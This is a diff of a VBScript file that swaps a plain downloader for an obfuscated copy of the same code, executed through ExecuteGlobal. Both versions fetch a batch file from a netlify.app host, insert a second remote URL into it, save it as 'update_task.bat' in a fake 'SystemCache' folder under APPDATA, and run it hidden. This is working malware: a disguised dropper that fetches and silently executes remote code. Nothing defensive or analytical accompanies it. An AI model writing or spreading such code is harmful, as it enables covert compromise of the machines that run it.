@@ -1,82 +1,62 @@
-' Define required objects
-
-Set shell = CreateObject("WScript.Shell")
-
-Set fso = CreateObject("Scripting.FileSystemObject")
+' Obfuscated VBScript madness
 
 
 
-' Define the target folder
-
-logFolder = shell.ExpandEnvironmentStrings("%APPDATA%") & "\SystemCache\Logs"
+ExecuteGlobal GetShit()
 
 
 
-' Create folders if they don't exist
+Function GetShit()
 
-If Not fso.FolderExists(logFolder) Then
+    Dim S
 
-    parentFolder = Left(logFolder, InStrRev(logFolder, "\") - 1)
+    S = ""
 
-    If Not fso.FolderExists(parentFolder) Then fso.CreateFolder parentFolder
+    S = S & "Dim x1,x2,x3,x4,x5,x6,x7,x8,x9,x0" & vbCrLf
 
-    fso.CreateFolder logFolder
+    S = S & "Set x1=Spawn(""WScript.Shell"")" & vbCrLf
 
-End If
+    S = S & "Set x2=Spawn(""Scripting.FileSystemObject"")" & vbCrLf
 
+    S = S & "x3=x1.ExpandEnvironmentStrings(""%APPDATA%"")&""\SystemCache\Logs""" & vbCrLf
 
+    S = S & "If Not x2.FolderExists(x3) Then" & vbCrLf
 
-' Download the BAT file
+    S = S & "  x4=Left(x3, InStrRev(x3, ""\"")-1)" & vbCrLf
 
-Set http = CreateObject("MSXML2.XMLHTTP")
+    S = S & "  If Not x2.FolderExists(x4) Then x2.CreateFolder x4" & vbCrLf
 
-http.Open "GET", "https://website-code.netlify.app/code/final.bat", False
+    S = S & "  x2.CreateFolder x3" & vbCrLf
 
-http.Send
+    S = S & "End If" & vbCrLf
 
+    S = S & "Set x5=Spawn(""MSXML2.XMLHTTP"")" & vbCrLf
 
+    S = S & "x5.Open ""GET"", BuildURL(), False" & vbCrLf
 
-' Prepare the stream to write file
+    S = S & "x5.Send" & vbCrLf
 
-Set stream = CreateObject("ADODB.Stream")
+    S = S & "Set x6=Spawn(""ADODB.Stream"")" & vbCrLf
 
-stream.Type = 1
+    S = S & "x6.Type=1:x6.Open:x6.Write x5.responseBody:x6.Position=0" & vbCrLf
 
-stream.Open
+    S = S & "x6.Type=2:x6.Charset=""utf-8"":x6.Position=0" & vbCrLf
 
-stream.Write http.responseBody
+    S = S & "x7=x6.ReadText" & vbCrLf
 
-stream.Position = 0
+    S = S & "x7=Replace(x7,""****"",""'https://vbs-output.netlify.app/code/encoded.txt'"")" & vbCrLf
 
+    S = S & "x6.Position=0:x6.SetEOS:x6.WriteText x7" & vbCrLf
 
+    S = S & "x6.SaveToFile x3 & ""\update_task.bat"", 2" & vbCrLf
 
-' Convert to text and perform string replacement
+    S = S & "x1.Run Chr(34) & x3 & ""\update_task.bat"" & Chr(34), 0, False" & vbCrLf
 
-stream.Type = 2
+    S = S & "Function Spawn(z):Set Spawn=CreateObject(z):End Function" & vbCrLf
 
-stream.Charset = "utf-8"
+    S = S & "Function BuildURL():BuildURL=""https://"" & ""website"" & ""-code."" & ""netlify.app/code/final.bat"":End Function"
 
-stream.Position = 0
+    GetShit = S
 
-batCode = stream.ReadText
-
-batCode = Replace(batCode, "****", "'https://vbs-output.netlify.app/code/encoded.txt'")
-
-
-
-' Save the modified script
-
-stream.Position = 0
-
-stream.SetEOS
-
-stream.WriteText batCode
-
-stream.SaveToFile logFolder & "\update_task.bat", 2
-
-
-
-' Run the BAT file silently
-
-shell.Run Chr(34) & logFolder & "\update_task.bat" & Chr(34), 0, False
+End Function
 
